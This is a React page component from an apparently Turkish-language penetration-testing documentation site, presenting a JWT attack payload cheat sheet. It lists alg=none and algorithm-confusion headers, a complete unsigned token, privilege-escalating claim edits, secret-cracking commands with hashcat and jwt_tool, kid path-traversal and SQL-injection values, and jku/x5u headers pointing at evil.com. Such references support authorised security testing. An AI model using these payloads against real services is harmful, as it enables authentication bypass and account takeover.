"use client"

import { motion } from "framer-motion"
import { Lock, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function JWTPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-red-400 text-sm font-medium mb-4">
          <Lock className="w-4 h-4" />
          <span>Authentication</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">JWT Attacks</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          JSON Web Token&apos;lardaki güvenlik zafiyetleri. Algorithm confusion, signature bypass,
          claim manipulation ve key confusion saldırıları.
        </p>
      </motion.div>

      <Callout type="info" title="JWT Yapısı">
        JWT üç parçadan oluşur: Header.Payload.Signature (base64url encoded).
        jwt.io ile decode edip içeriği inceleyin.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Algorithm Attacks</h2>
        <PayloadList
          title="Algorithm Manipulation"
          initialShow={8}
          payloads={[
            { code: `{"alg":"none","typ":"JWT"}`, note: "alg=none → imza kontrolü devre dışı" },
            { code: `{"alg":"None","typ":"JWT"}`, note: "Case variation" },
            { code: `{"alg":"NONE","typ":"JWT"}` },
            { code: `{"alg":"nOnE","typ":"JWT"}` },
            { code: `{"alg":"HS256","typ":"JWT"} → sign with RSA public key`, note: "RS256→HS256 confusion: public key = HMAC secret" },
            { code: `{"alg":"HS384","typ":"JWT"}`, note: "Algorithm downgrade" },
            { code: `{"alg":"HS512","typ":"JWT"}` },
            { code: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.`, note: "Complete alg=none token (empty signature)" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Claim Manipulation</h2>
        <PayloadList
          title="Payload Tampering"
          initialShow={8}
          payloads={[
            { code: `{"sub":"admin","role":"admin"}`, note: "Role escalation" },
            { code: `{"sub":"victim_id"}`, note: "User ID takeover" },
            { code: `{"sub":"1","iss":"trusted-issuer"}`, note: "Issuer spoofing" },
            { code: `{"exp":9999999999}`, note: "Expiry uzatma (2286 yılı)" },
            { code: `{"aud":"admin-panel"}`, note: "Audience değiştirme" },
            { code: `{"sub":"1","admin":true}`, note: "Admin claim injection" },
            { code: `{"sub":"1","scope":"admin:read admin:write"}`, note: "Scope escalation" },
            { code: `{"sub":"1","email":"admin@target.com"}`, note: "Email claim tampering" },
            { code: `Token without exp claim`, note: "Never-expiring token" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Key Attacks</h2>
        <PayloadList
          title="Key Confusion & Brute Force"
          initialShow={8}
          payloads={[
            { code: `jwt-cracker <token> -d /usr/share/wordlists/rockyou.txt`, note: "HMAC secret brute force" },
            { code: `hashcat -m 16500 jwt.txt rockyou.txt`, note: "Hashcat JWT crack" },
            { code: `python3 jwt_tool.py <token> -C -d wordlist.txt`, note: "jwt_tool brute force" },
            { code: `{"alg":"RS256"} → {"alg":"HS256"} + sign with leaked public key`, note: "Key confusion attack" },
            { code: `Common weak secrets: secret, password, 123456, changeme`, note: "Default secrets" },
            { code: `{"kid":"../../etc/passwd"}`, note: "KID path traversal" },
            { code: `{"kid":"key1' UNION SELECT 'secret' -- "}`, note: "KID SQL injection" },
            { code: `{"kid":"/dev/null"}`, note: "KID null key → empty secret" },
            { code: `{"jku":"https://evil.com/jwks.json"}`, note: "JKU header injection" },
            { code: `{"x5u":"https://evil.com/cert.pem"}`, note: "X5U header injection" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Token Handling</h2>
        <PayloadList
          title="Token Misuse"
          initialShow={6}
          payloads={[
            { code: `Use access token after logout → still valid?`, note: "Token invalidation check" },
            { code: `Use token from different environment (staging → prod)`, note: "Cross-environment" },
            { code: `Modify token, keep old signature → signature not checked?`, note: "Signature validation check" },
            { code: `Token in URL parameter → log exposure`, note: "Token leakage" },
            { code: `Reuse refresh token multiple times`, note: "Refresh token rotation check" },
            { code: `Use expired token → accepted?`, note: "Expiry validation" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Araçlar">
        1. jwt.io - JWT decode/encode{"\n"}
        2. jwt_tool - comprehensive JWT testing{"\n"}
        3. hashcat -m 16500 - JWT secret cracking{"\n"}
        4. Burp JWT Editor extension{"\n"}
        5. python-jwt - programmatic JWT manipulation
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/auth/oauth" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>OAuth</span>
        </Link>
        <Link href="/docs/auth/session" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>Session Management</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
